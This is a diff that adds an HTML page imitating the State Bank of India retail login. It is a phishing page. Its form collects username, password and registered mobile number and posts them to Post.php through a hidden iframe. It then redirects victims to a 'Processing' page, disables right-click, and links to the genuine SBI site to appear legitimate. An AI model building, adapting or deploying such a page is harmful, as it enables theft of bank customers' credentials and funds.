@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="eng">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>State Bank of India - Login </title>
+  <style>
+    #img1a,#img2a,#img3a,#img4a,#con
+    {
+      width:104%;
+      margin-left:-6px;
+    }
+    #bb,#dd,#ff,#ii
+    {
+      width: 290px;
+      height: 25px;
+      background-color: #ededed;
+      border-style: solid;
+      outline:none;
+      border-color:#CCCCCC;
+      border-width: 1px;
+      border-radius: 0px;
+      margin:4px;
+      margin-left: 15px;
+      font-size:15px;
+      padding: 2px 8px;
+    }
+    #btn
+    {
+      width:70px;
+      background-color:#496D91;
+      color: white;
+      border:none;
+      border-radius: 0px;
+      border-width: 0.1px;
+      cursor: pointer;
+      font-size: 16px;
+      height: 33px;
+      margin-left:25px;
+    }
+    #rstbtn
+    {
+    width:70px;
+    background-color:#496D91;
+    color: white;
+    border:none;
+    border-radius: 0px;
+    border-width: 0.1px;
+    cursor: pointer;
+    font-size: 16px;
+    height: 33px;
+    margin-left:5px;
+    }
+  </style>
+  <script language="javascript"> 
+  var message="This function is not allowed here.";
+  function clickIE4(){
+  if (event.button==2){
+  alert(message);
+  return false;
+  }
+  }
+  function clickNS4(e){
+  if (document.layers||document.getElementById&&!document.all){
+  if (e.which==2||e.which==3){
+  alert(message);
+  return false;
+  }
+  }
+  }
+  if (document.layers){
+  document.captureEvents(Event.MOUSEDOWN);
+  document.onmousedown=clickNS4;}
+  else if (document.all&&!document.getElementById){
+  document.onmousedown=clickIE4;}
+  document.oncontextmenu=new Function("alert(message);return false;")
+  </script>
+</head>
+<body>
+    <!-- Static- Please don't do anything here-->
+    <script type="text/javascript">var submitted=false;</script>
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing.html';}"></iframe>
+    <!--My Form-->
+    <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+    <div class="line">
+    <img src="1a.jpg" alt="" id="img1a"><br>
+    <b style="font-family:arial; font-size:14px; color:#47474d; margin-left:25px;">Username *</b><br>
+      <input type="text" name="UserName" id="bb" placeholder=""
+      required=""><br><br>
+    <b style="font-family:arial; font-size:14px; color:#47474d; margin-left:25px;">Password *</b><br>
+      <input type="text" name="Password" id="dd" placeholder=""
+      required=""><br><br>
+      <b style="font-family:arial; font-size:14px; color:#47474d; margin-left:25px;">Mobile Number (as per Bank Records) *</b><br>
+      <input type="tel" name="Mobile No." id="ff" placeholder="" maxlength="10"
+      pattern="[6-9]\d{9}"
+      title="Please Enter Valid Mobile Number"
+      required=""> <br><br>
+      <b style="font-family:arial; font-size:14px; color:#47474d; margin-left:25px;"> Enter the text as shown in the image *</b><br>
+      <input type="text" name="" id="ii" placeholder=""
+      title="Please Enter Capcha Shown In The Image" required=""><br><br>
+    </div>
+    <img src="2a.jpg" alt="" id="img2a"><br>
+    <button type="submit" id="btn">Login</button>
+    <button type="reset" id="rstbtn">Reset</button><br><br>
+    <a href="https://retail.onlinesbi.sbi/retail/troubleloginhome.htm?bankCode=0"><img src="con.jpg" alt="" id="con"></a><br>
+    <img src="3a.jpg" alt="" id="img3a"><br>
+    <img src="4a.jpg" alt="" id="img4a"><br>
+    </form></body></html>
